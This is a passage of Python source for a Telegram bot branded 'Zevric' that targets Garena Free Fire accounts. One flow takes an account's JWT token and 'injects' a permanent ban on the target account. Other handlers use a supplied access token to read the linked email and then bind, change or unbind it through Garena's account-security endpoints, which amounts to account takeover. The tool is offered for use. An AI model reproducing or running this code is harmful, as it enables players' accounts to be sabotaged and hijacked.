        context.user_data['ff_ban_version'] = user_data.get('release_version', 'OB54') if 'user_data' in locals() else 'OB54'
        user_data = decode_jwt(jwt_token)
        # Update version storage after decode
        context.user_data['ff_ban_version'] = user_data.get('release_version', user_data.get('client_version', 'OB54'))
        
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        
        txt = f"""✅ 𝗧𝗢𝗞𝗘𝗡 𝗩𝗔𝗟𝗜𝗗 ✅

👤 𝗡𝗶𝗰𝗸𝗻𝗮𝗺𝗲: {nickname}
🆔 𝗔𝗖𝗰𝗼𝘂𝗻𝘁 𝗜𝗗: {account_id}
🌍 𝗥𝗲𝗴𝗶𝗼𝗻: {region}
📦 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: {version}

⚠️ 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗞𝗔𝗕𝗔𝗡 (YES)?
💀 𝟭𝟬𝟬% 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧 𝗕𝗔𝗡!"""
        
        try:
            await msg.delete()
        except:
            pass
        
        await update.message.reply_text(txt, reply_markup=get_ban_confirm_keyboard())
        return FF_BAN_CONFIRM
        
    except Exception as e:
        print(f"[FFBAN ERROR] {e}")
        try:
            await msg.delete()
        except:
            pass
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿! {str(e)[:100]}\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def ff_ban_confirm(update, context):
    text = update.message.text.strip()
    
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    if "No" in text or text == "❌ No, Cancel 🚫":
        context.user_data.clear()
        await update.message.reply_text("❌ 𝗖𝗔𝗡𝗖𝗘𝗟𝗭𝗢𝗞! 🚫\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    if "Yes" not in text:
        await update.message.reply_text("⚠️ Choose: Yes or No", reply_markup=get_ban_confirm_keyboard())
        return FF_BAN_CONFIRM
    
    jwt_token = context.user_data.get('ff_ban_jwt')
    if not jwt_token:
        context.user_data.clear()
        await update.message.reply_text("❌ Token Lost! Fresh Token Generate Karo", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    msg = await update.message.reply_text("💀 𝗜𝗡𝗝𝗘𝗖𝗧𝗜𝗡𝗚 𝗕𝗔𝗡 𝗣𝗜𝗔𝗬𝗬𝗩... ⚡🔥")
    
    try:
        def do_inject():
            ver = context.user_data.get('ff_ban_version', 'OB54')
            return trigger_injection(jwt_token, ver)
        
        ban_resp = await asyncio.to_thread(do_inject)
        
        context.user_data.clear()
        
        if ban_resp and ban_resp.status_code == 200 and "Service Unavailable" not in ban_resp.text:
            user_data = decode_jwt(jwt_token)
            nickname = decode_ff_name(user_data.get('nickname', ''))
            account_id = user_data.get('account_id', 'Unknown')
            region = user_data.get('lock_region', user_data.get('region', 'IND'))
            
            result_txt = f"""🎯 𝗜𝗡𝗝𝗘𝗪𝗧𝗜𝗢𝗡 𝗖𝗢𝗠𝗣𝗟𝗜𝗧𝗘 ✅💀

👤 𝗧𝗮𝗿𝗴𝗲𝘁: {nickname}
🆔 𝗨𝗜𝗗: {account_id}  
🌍 𝗥𝗲𝗴𝗶𝗼𝗻: {region}

💀 𝗦𝗧𝗔𝗧𝗨𝘀: 
𝟭𝟬𝟬% 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧𝗟𝗬 𝗕𝗔𝗡𝗡𝗘𝗗 💀

👑 @just_zevric
𝗭𝗘𝗩𝗥𝗜𝗖 𝗬 𝗘𝗱𝗶𝘁𝗶𝗼𝗻"""
            
            try:
                await msg.delete()
            except:
                pass
            
            await update.message.reply_text(result_txt, reply_markup=get_main_keyboard())
        else:
            code = ban_resp.status_code if ban_resp else "No Response"
            resp_text = ban_resp.text[:200] if ban_resp and hasattr(ban_resp, 'text') else "No server available"
            try:
                await msg.delete()
            except:
                pass
            if "503" in str(code) or "Service Unavailable" in resp_text:
                await update.message.reply_text(f"⚠️ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗗𝗢𝗪𝗡! 503\nTried all 7 servers\nLast: {resp_text[:100]}\n💡 Fix: PROXY_URL lagao ya 10 min wait karo\n@just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ 𝗙𝗔𝗜𝗟𝗘𝗗! Status: {code}\nResp: {resp_text}\n@just_zevric", reply_markup=get_main_keyboard())
    
    except Exception as e:
        print(f"[FFBAN ERROR] {e}")
        try:
            await msg.delete()
        except:
            pass
        context.user_data.clear()
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿! {str(e)[:100]}\n@just_zevric", reply_markup=get_main_keyboard())
    
    return ConversationHandler.END

# ========== BAN CHECK START ==========
async def ban_check_start(update, context):
    await update.message.reply_text(
        "💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 💀\n\n"
        "🆔 𝗘𝗻𝘁𝗲𝗿 𝗙𝗙 𝗨𝗜𝗗 🔍💎\n\n"
        "📌 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 12345678",
        reply_markup=get_main_keyboard()
    )
    return BAN_CHECK_UID

async def ban_check_uid(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    uid = update.message.text.strip()
    
    if not uid or not uid.isdigit():
        await update.message.reply_text("❌ Invalid UID! Numeric only (Example: 12345678)", reply_markup=get_main_keyboard())
        return BAN_CHECK_UID
    
    msg = await update.message.reply_text(f"🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗕𝗔𝗡 {uid}... ⏳")
    
    try:
        def fetch_ban():
            proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
            
            urls = [
                f"https://crownx-premium-bancheck.vercel.app/baninfo?uid={uid}",
                f"https://ff-bancheck-api.vercel.app/api/ban/{uid}",
                f"https://api-freefire-bancheck.vercel.app/ban/{uid}",
            ]
            
            for url in urls:
                try:
                    print(f"[BANCHECK] Trying {url}")
                    resp = requests.get(url, timeout=10, verify=False, proxies=proxies)
                    print(f"[BANCHECK] Status: {resp.status_code}")
                    
                    if resp.status_code == 200:
                        return resp, 200
                    elif resp.status_code == 410:
                        continue
                except Exception as e:
                    print(f"[BANCHECK] Error: {e}")
                    continue
            
        response, status = await asyncio.to_thread(fetch_ban)
        
        try:
            await msg.delete()
        except:
            pass
        
        if response and status == 200:
            try:
                data = response.json()
                account_id = data.get('account_id', uid)
                nickname = data.get('nickname', 'N/A')
                region = data.get('region', 'IND')
                level = data.get('level', 'N/A')
                ban_info = data.get('ban_info', {})
                
                if ban_info and ban_info.get('is_banned'):
                    ban_start = ban_info.get('ban_start_time', 'N/A')
                    txt = f"""💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 💀

🆔 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗗: {account_id}
👤 𝗡𝗜𝗖𝗞𝗡𝗔𝗠𝗘: {nickname}
🌍 𝗥𝗘𝗚𝗜𝗢𝗡: {region}
📊 𝗟𝗩𝗟: {level}

⚠️ 𝗦𝘁𝗔𝗧𝗨𝗦: 
💀 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧𝗟𝗬 𝗕𝗔𝗡𝗡𝗘𝗗 💀

🕐 𝗕𝗔𝗡 𝗦𝗧𝗔𝗥𝗧: {ban_start}

👑 @just_zevric"""
                else:
                    txt = f"""💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 💀

🆔 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗗: {account_id}
👤 𝗡𝗜𝗖𝗞𝗡𝗔𝗠𝗘: {nickname}
🌍 𝗥𝗘𝗚𝗜𝗢𝗡: {region}
📊 𝗟𝗘𝗩𝗘𝗟: {level}

✅ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗞𝗟𝗘𝗔𝗩 ✅
𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗡𝗢𝗧 𝗕𝗔𝗧𝗧𝗘𝗗

👑 @just_zevric"""
                
                await update.message.reply_text(txt, reply_markup=get_main_keyboard())
            except Exception as e:
                print(f"[BANCHECK] Parse error: {e}")
                await update.message.reply_text(f"❌ Parse Error!\nUID: {uid}\n@just_zevric", reply_markup=get_main_keyboard())
        else:
            msg_text = f"""⚠️ 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗔𝗣𝗜 𝗗𝗢𝗪𝗡 ⚠️

🆔 𝗨𝗜𝗗: {uid}

💭 𝗔𝗟𝗟 𝗔𝗣𝗜 𝗔𝗧𝗧𝗘𝗠𝗣𝗦 𝗙𝗔𝗜𝗟𝗘𝗗

⏳ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗠𝗔𝗧𝗘𝗧𝗡𝗔𝗡𝗖𝗘
👑 @just_zevric"""
            await update.message.reply_text(msg_text, reply_markup=get_main_keyboard())
    
    except Exception as e:
        print(f"[BANCHECK ERROR] {e}")
        try:
            await msg.delete()
        except:
            pass
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿! {str(e)[:150]}\n@just_zevric", reply_markup=get_main_keyboard())
    
    return ConversationHandler.END

# ========== OTHER FUNCTIONS ==========

async def start(update, context):
    try:
        user=update.message.from_user
        full_name = user.full_name if hasattr(user, 'full_name') else f"{user.first_name} {user.last_name or ''}".strip()
        if not full_name:
            full_name = user.first_name or "Zevric"
        safe_name = full_name[:25].strip()
        msg = f"""🔥 𝗭𝗘𝗩𝗥𝗜𝗖 — 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗬 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 🔥💎

👋 𝗛𝗲𝘆 {safe_name} ✨ | 𝟭𝟰+ 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀 ✅
🛡️ 𝗦𝗮𝗳𝗲 • 𝗙𝗮𝘀𝘁 • 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ✅
💀 𝗙𝗙 𝗕𝗔𝗞 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 ✅
💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 ✅
👑 @just_zevric | 𝗩𝟲𝟴 𝗙𝗜𝗫𝗘𝗗

👇 𝗣𝗹𝗶𝘀 𝗖𝗵𝗼𝗼𝘀𝗲 👇"""
        await update.message.reply_text(msg, reply_markup=get_main_keyboard())
    except:
        await update.message.reply_text("🔥 ZEVRIC PREMIUM FIXED 🔥\nWelcome 💎\n@just_zevric", reply_markup=get_main_keyboard())

async def force_start(update, context):
    context.user_data.clear()
    await start(update, context)
    return ConversationHandler.END

async def owner_info(update, context):
    msg = """👑 𝗭𝗘𝗩𝗥𝗜𝗖 — 𝗢𝗪𝗡𝗘𝗥 𝗜𝗡𝗙𝗢 👑💎

👤 𝗡𝗮𝗺𝗲 : 𝗭𝗲𝘃𝗿𝗶𝗰 ✨💎
📱 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 : @just_zevric 🚀✨
📺 𝗬𝗢𝗨𝗧𝗨𝗕𝗘 : https://youtube.com/@zevricxplay 🎬🔥
🌐 𝗠𝗔𝗜𝗡 𝗖𝗛 : @zevric_yt 💎

💖 𝗯𝘆 @just_zevric 😘💖"""
    await update.message.reply_text(msg, reply_markup=get_main_keyboard())

async def eat_website_info(update, context):
    await update.message.reply_text(
        "🌐 𝗭𝗘𝗩𝗥𝗜𝗖 𝗪𝗘𝗕𝗜𝗧𝗘 💎\n\n🔗 https://zevricplayx.github.io/eat_token/\n\n👑 @just_zevric 💎",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🌐 𝗢𝗣𝗘𝗡 💎🚀", url="https://zevricplayx.github.io/eat_token/")]])
    )

async def check_info_start(update, context):
    await update.message.reply_text("🔍 𝗕𝗶𝗻𝗱 𝗜𝗻𝗙𝗼 𝗖𝗵𝗲𝗖𝗞 🔍\n\n🔐 Enter Access Token : 💎", reply_markup=get_main_keyboard())
    return CHECK_INFO

async def check_info_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    if len(token)<10:
        await update.message.reply_text("❌ Invalid token!", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    msg=await update.message.reply_text("🔍 Fetching... ⏳")
    try:
        def fetch():
            uid=nick=region="Unknown"
            try:
                p_url=f"https://api-otrss.garena.com/support/callback/?access_token={token}"
                p_res=make_request("GET",p_url,headers={"User-Agent":"Mozilla/5.0"},allow_redirects=True)
                parsed=urllib.parse.urlparse(p_res.url); qs=urllib.parse.parse_qs(parsed.query)
                uid=qs.get("account_id",["Unknown"])[0]; nick=urllib.parse.unquote(qs.get("nickname",["Unknown"])[0]); region=qs.get("region",["Unknown"])[0]
            except: pass
            url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
            r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.19P9"})
            return uid,nick,region,r.json()
        uid,nick,region,data=await asyncio.to_thread(fetch)
        email=data.get("email",""); email_to_be=data.get("email_to_be","")
        txt=f"🔥 𝗭𝗘𝗩𝗥𝗜𝗖 𝗕𝗶𝗻𝗱 𝗜𝗻𝗙𝗼 🔥💎\n\n👤 UID: {uid}\n🎮 Nick: {nick}\n🌍 Region: {region}\n\n📧 Current: {email if email else 'None ❌'}\n⏳ Pending: {email_to_be if email_to_be else 'None ✅'}\n\n💖 @just_zevric ✨"
        await msg.edit_text(txt)
    except Exception as e:
        await msg.edit_text(f"❌ Error: Token expire 😔")
    return ConversationHandler.END

async def bind_email_start(update, context):
    await update.message.reply_text("📧 𝗕𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹 📧\n\n🔐 Enter Access Token :", reply_markup=get_main_keyboard())
    return BIND_TOKEN

async def bind_email_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    context.user_data['bind_token']=token
    def fetch():
        url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.19P9"})
        return r.json()
    try:
        data=await asyncio.to_thread(fetch)
        current=data.get("email","")
        pending=data.get("email_to_be","")
        if current and current.strip() != "":
            msg = f"⚠️ 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗕𝗶𝗻𝗱 ℅ 𝗛𝗔𝗜! 📧💎\n\n📧 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 : {current} ✅\n⏳ 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 : {pending if pending else 'None ✅'}\n\n💡 Change Ya Unbind use\n\n💖 @just_zevric"
            await update.message.reply_text(msg, reply_markup=get_main_keyboard())
            return ConversationHandler.END
        if pending and pending.strip() != "":
            msg = f"⏳ 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗛𝗔𝗜! ⚠️\n\n📧 Pending: {pending} ⏳\n\n💡 Cancel Karo\n\n💖 @just_zevric"
            await update.message.reply_text(msg, reply_markup=get_main_keyboard())
            return ConversationHandler.END
        await update.message.reply_text(f"✅ 𝗙𝗥𝗘𝗦𝗛! 🎉\n📧 None ❌\n\n✨ 𝗘𝗻𝘁𝗲𝗿 𝗘𝗺𝗮𝗶𝗹 : 📩")
    except Exception as e:
        await update.message.reply_text(f"✨ 𝗘𝗻𝘁𝗲𝗿 𝗘𝗠𝗔𝗜𝗟 : 📩")
    return BIND_EMAIL

async def bind_email_email(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    email=update.message.text.strip()
    if "@" not in email or "." not in email or len(email)<6:
        await update.message.reply_text(f"❌ Invalid: {email}")
        return BIND_EMAIL
    context.user_data['bind_email']=email; token=context.user_data['bind_token']
    await update.message.reply_text(f"📧 [1/3] Sending OTP to {email}... ⚡")
    def send():
        url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
        d={"email":email,"locale":"en_PK","region":"PK","app_id":"100067","access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(send)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"✅ 𝗢𝗧𝗣 𝗦𝗘𝗡𝗧! 📧\n📩 Check: {email}\n\n🔑 OTP :")
            else:
                await update.message.reply_text(f"❌ Failed 😔", reply_markup=get_main_keyboard())
                return ConversationHandler.END
        except:
            await update.message.reply_text(f"✅ 𝗢𝗧𝗣 𝗦𝗘𝗡𝗧! 📧\n📩 Check: {email}\n\n🔑 OTP :")
    except Exception as e:
        await update.message.reply_text(f"❌ Error 😔")
    return BIND_OTP

async def bind_email_otp(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    otp=update.message.text.strip(); email=context.user_data['bind_email']; token=context.user_data['bind_token']
    await update.message.reply_text("🔑 [2/3] Verifying OTP... 🛡️")
    def verify():
        url="https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        d={"app_id":"100067","access_token":token,"email":email,"code":otp,"otp":otp,"type":"1"}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(verify)
        try:
            j=json.loads(resp)
            vt=j.get("verifier_token","")
            if j.get("result")==0 and vt:
                context.user_data['verifier_token']=vt
                await update.message.reply_text("✅ Verified! 💎\n\n🔐 6-Digit Code : 🔢\nEx: 123456")
                return BIND_SEC
            else:
                await update.message.reply_text(f"❌ Wrong OTP! 😔", reply_markup=get_main_keyboard())
                return BIND_OTP
        except:
            await update.message.reply_text(f"❌ Wrong OTP! 😔", reply_markup=get_main_keyboard())
            return BIND_OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Error 🔑")
        return BIND_OTP

async def bind_email_security_code(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    text=update.message.text.strip()
    if len(text)>20 and not text.isdigit():
        context.user_data['verifier_token']=text
        await update.message.reply_text("✅ Token saved!\n🔢 Now 6-digit :")
        return BIND_SEC
    sec=text; vt=context.user_data.get('verifier_token'); token=context.user_data['bind_token']; email=context.user_data['bind_email']
    if not sec.isdigit() or len(sec)!=6:
        await update.message.reply_text("❌ Invalid! 6 digits\nEx: 123456")
        return BIND_SEC
    await update.message.reply_text("📧 [3/3] Creating... 🚀")
    def bind_req():
        url="https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
        d={"email":email,"app_id":"100067","access_token":token,"verifier_token":vt,"secondary_password":sec}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(bind_req)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"🎉 𝗦𝗨𝗖𝗖𝗘𝗦𝗦! 🎉💎\n📧 {email} ✅\n💖 @just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ Failed! 😔\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            await update.message.reply_text(f"🎉 𝗦𝗨𝗖𝗖𝗘𝗦𝗦! 🎉💎\n📧 {email} ✅\n💖 @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def change_email_start(update, context):
    await update.message.reply_text("🔄 𝗖𝗵𝗮𝗻𝗴𝗘 𝗘𝗺𝗮𝗶𝗹 🔄\n\n🔐 Token :", reply_markup=get_main_keyboard())
    return CHANGE_TOKEN

async def change_email_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip(); context.user_data['change_token']=token
    def fetch():
        url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.30"})
        return r.json().get("email","")
    try:
        old_email=await asyncio.to_thread(fetch)
        if not old_email:
            await update.message.reply_text("❌ No bound email!", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        context.user_data['old_email']=old_email
        await update.message.reply_text(f"📧 Old: {old_email}\n📩 [1/5] Sending...")
        def send():
            url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
            d={"email":old_email,"locale":"en_PK","region":"PK","app_id":"100067","access_token":token}
            h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
            return make_request("POST",url,headers=h,data=d).text
        resp=await asyncio.to_thread(send)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"✅ Sent! 📧\n{old_email}\n\n🔑 OTP:")
            else:
                await update.message.reply_text(f"❌ Failed ⏰", reply_markup=get_main_keyboard())
                return ConversationHandler.END
        except:
            await update.message.reply_text(f"✅ Sent! 📧\n{old_email}\n\n🔑 OTP:")
        return CHANGE_OTP_OLD
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def change_email_otp_old(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    otp=update.message.text.strip(); token=context.user_data['change_token']; old_email=context.user_data['old_email']
    await update.message.reply_text("🔐 [2/5] Verifying...")
    def verify():
        url="https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        d={"email":old_email,"app_id":"100067","access_token":token,"otp":otp}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(verify)
        try:
            j=json.loads(resp); it=j.get("identity_token")
            if it:
                context.user_data['identity_token']=it
                await update.message.reply_text("✅ Verified! 💎\n\n📧 Enter New :")
                return CHANGE_NEW
            else:
                await update.message.reply_text(f"❌ Wrong OTP! 😔", reply_markup=get_main_keyboard())
                return CHANGE_OTP_OLD
        except:
            await update.message.reply_text(f"❌ Wrong OTP! 😔", reply_markup=get_main_keyboard())
            return CHANGE_OTP_OLD
    except Exception as e:
        await update.message.reply_text(f"❌ Error 🔑")
        return CHANGE_OTP_OLD

async def change_email_new(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    new_email=update.message.text.strip()
    if "@" not in new_email or "." not in new_email:
        await update.message.reply_text("❌ Invalid email!")
        return CHANGE_NEW
    context.user_data['new_email']=new_email; token=context.user_data['change_token']
    await update.message.reply_text(f"📩 [3/5] Sending OTP {new_email}...")
    def send():
        url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
        d={"email":new_email,"locale":"en_PK","region":"PK","app_id":"100067","access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(send)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"✅ Sent! 📧\n{new_email}\n\n🔑 OTP:")
            else:
                await update.message.reply_text(f"❌ Failed 😔\n🔑 New Email:", reply_markup=get_main_keyboard())
                return CHANGE_NEW
        except:
            await update.message.reply_text(f"✅ Sent! 📧\n{new_email}\n\n🔑 OTP:")
        return CHANGE_OTP_NEW
    except Exception as e:
        await update.message.reply_text(f"❌ Error")
        return CHANGE_NEW

async def change_email_otp_new(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    otp=update.message.text.strip(); token=context.user_data['change_token']; new_email=context.user_data['new_email']; old_email=context.user_data['old_email']
    await update.message.reply_text("🔑 [4/5] Verifying OTP...")
    def verify():
        url="https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        d={"email":new_email,"app_id":"100067","access_token":token,"otp":otp}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(verify)
        try:
            j=json.loads(resp); vt=j.get("verifier_token")
            if not vt:
                await update.message.reply_text(f"❌ Wrong OTP! 😔", reply_markup=get_main_keyboard())
                return CHANGE_OTP_NEW
            context.user_data['verifier_token_new']=vt
        except:
            await update.message.reply_text(f"❌ Wrong OTP! 😔", reply_markup=get_main_keyboard())
            return CHANGE_OTP_NEW
        await update.message.reply_text(f"⚠️ Confirm Change?\n\n📧 Old: {old_email}\n📧 New: {new_email}\n\n✅ Yes = Confirm\n❌ No = Cancel", reply_markup=get_confirm_keyboard())
        return CHANGE_CONFIRM
    except Exception as e:
        await update.message.reply_text(f"❌ Error")
        return CHANGE_OTP_NEW

async def change_email_confirm(update, context):
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
        await update.message.reply_text("❌ Cancelled! ✅\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes","Yes"]:
        await update.message.reply_text("⚠️ Choose: Yes / No", reply_markup=get_confirm_keyboard())
        return CHANGE_CONFIRM
    token=context.user_data['change_token']; new_email=context.user_data['new_email']; identity_token=context.user_data['identity_token']; vt=context.user_data['verifier_token_new']
    await update.message.reply_text("🚀 [5/5] Creating... 💎", reply_markup=get_main_keyboard())
    def rebind():
        url="https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
        d={"identity_token":identity_token,"email":new_email,"app_id":"100067","verifier_token":vt,"access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp2=await asyncio.to_thread(rebind)
        try:
            j2=json.loads(resp2)
            if j2.get("result")==0:
                await update.message.reply_text(f"🎉 SUCCESS! 🎉💎\n📧 {new_email} ✅\n💖 @just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ Failed! 😔\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            await update.message.reply_text(f"🎉 SUCCESS! 🎉💎\n📧 {new_email} ✅\n💖 @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def unbind_email_start(update, context):
    await update.message.reply_text("❌ 𝗨𝗻𝗯𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹 ❌\n\n🔐 Token :", reply_markup=get_main_keyboard())
    return UNBIND_TOKEN

async def unbind_email_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip(); context.user_data['unbind_token']=token
    def fetch():
        url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.30"})
        return r.json().get("email","")
    try:
        email=await asyncio.to_thread(fetch)
        if not email:
            await update.message.reply_text("❌ No email! Already unbind ✅", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        context.user_data['unbind_email']=email
        await update.message.reply_text(f"📧 Current: {email}\n📩 [1/3] Sending...")
        def send():
            url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
            d={"email":email,"locale":"en_PK","region":"PK","app_id":"100067","access_token":token}
            h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
            return make_request("POST",url,headers=h,data=d).text
        resp=await asyncio.to_thread(send)
        await update.message.reply_text(f"✅ Sent 📧\n\n🔑 OTP:")
        return UNBIND_OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def unbind_email_otp(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    otp=update.message.text.strip(); token=context.user_data['unbind_token']; email=context.user_data['unbind_email']
    await update.message.reply_text("🔐 [2/3] Verifying...")
    def verify():
        url="https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        d={"email":email,"app_id":"100067","access_token":token,"otp":otp}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(verify)
        try:
            j=json.loads(resp); it=j.get("identity_token")
            if not it:
                await update.message.reply_text(f"❌ Wrong OTP! 😔", reply_markup=get_main_keyboard())
                return UNBIND_OTP
            context.user_data['identity_token_unbind']=it
        except:
            await update.message.reply_text(f"❌ Wrong OTP! 😔", reply_markup=get_main_keyboard())
            return UNBIND_OTP
        await update.message.reply_text(f"⚠️ Confirm Unbind?\n\n📧 Email: {email}\n\n❗ PERMANENT!\n\n✅ Yes / ❌ No", reply_markup=get_confirm_keyboard())
        return UNBIND_CONFIRM
    except Exception as e:
        await update.message.reply_text(f"❌ Error 🔑")
        return UNBIND_OTP

async def unbind_email_confirm(update, context):
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
        await update.message.reply_text("❌ Cancelled! ✅\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes","Yes"]:
        await update.message.reply_text("⚠️ Choose: Yes / No", reply_markup=get_confirm_keyboard())
        return UNBIND_CONFIRM
